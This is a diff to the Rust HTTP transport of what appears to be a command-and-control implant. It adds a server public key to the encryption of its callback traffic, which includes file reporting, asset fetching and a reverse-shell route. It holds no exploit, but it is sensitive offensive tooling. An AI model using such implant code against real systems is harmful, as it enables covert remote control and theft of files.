@@ -84,12 +84,12 @@ static _REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 
 // Marshal: Encode and encrypt a message using the ChachaCodec
 // Uses the helper functions exported from pb::xchacha
-fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
+fn marshal_with_codec<Req, Resp>(msg: Req, server_pubkey: [u8; 32]) -> Result<Vec<u8>>
 where
     Req: Message + Send + 'static,
     Resp: Message + Default + Send + 'static,
 {
-    pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
+    pb::xchacha::encode_with_chacha::<Req, Resp>(msg, server_pubkey)
 }
 
 // Unmarshal: Decrypt and decode a message using the ChachaCodec
@@ -106,6 +106,7 @@ where
 pub struct HTTP {
     client: hyper::Client<hyper::client::HttpConnector>,
     base_url: String,
+    server_pubkey: [u8; 32],
 }
 
 impl HTTP {
@@ -156,7 +157,7 @@ impl HTTP {
         Resp: Message + Default + Send + 'static,
     {
         // Marshal and encrypt the request
-        let request_bytes = marshal_with_codec::<Req, Resp>(request)?;
+        let request_bytes = marshal_with_codec::<Req, Resp>(request, self.server_pubkey)?;
 
         // Build and send the request
         let uri = self.build_uri(path)?;
@@ -244,7 +245,7 @@ impl HTTP {
     }
 
     /// Create a streaming HTTP body that encodes requests as gRPC frames (client-streaming pattern)
-    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper::Body
+    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>, server_pubkey: [u8; 32]) -> hyper::Body
     where
         Req: Message + Send + 'static,
         Resp: Message + Default + Send + 'static,
@@ -254,7 +255,7 @@ impl HTTP {
         tokio::spawn(async move {
             for req_chunk in receiver {
                 // Marshal and encrypt each chunk
-                let request_bytes = match marshal_with_codec::<Req, Resp>(req_chunk) {
+                let request_bytes = match marshal_with_codec::<Req, Resp>(req_chunk, server_pubkey) {
                     Ok(bytes) => bytes,
                     Err(_err) => {
                         #[cfg(debug_assertions)]
@@ -306,10 +307,11 @@ impl Transport for HTTP {
         HTTP {
             client,
             base_url: String::new(),
+            server_pubkey: [0u8; 32], // Default pubkey for empty transport
         }
     }
 
-    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
+    fn new(callback: String, _proxy_uri: Option<String>, server_pubkey: [u8; 32]) -> Result<Self> {
         // Create HTTP connector
         let mut connector = hyper::client::HttpConnector::new();
         connector.enforce_http(false); // Allow HTTPS
@@ -321,6 +323,7 @@ impl Transport for HTTP {
         Ok(Self {
             client,
             base_url: callback,
+            server_pubkey,
         })
     }
 
@@ -337,7 +340,7 @@ impl Transport for HTTP {
         let filename = request.name.clone();
 
         // Marshal and encrypt the request
-        let request_bytes = marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?;
+        let request_bytes = marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request, self.server_pubkey)?;
 
         // Build and send the request
         let uri = self.build_uri(FETCH_ASSET_PATH)?;
@@ -379,7 +382,7 @@ impl Transport for HTTP {
         request: Receiver<ReportFileRequest>,
     ) -> Result<ReportFileResponse> {
         // Create streaming body
-        let body = Self::create_streaming_body::<ReportFileRequest, ReportFileResponse>(request);
+        let body = Self::create_streaming_body::<ReportFileRequest, ReportFileResponse>(request, self.server_pubkey);
 
         // Build and send the request
         let uri = self.build_uri(REPORT_FILE_PATH)?;
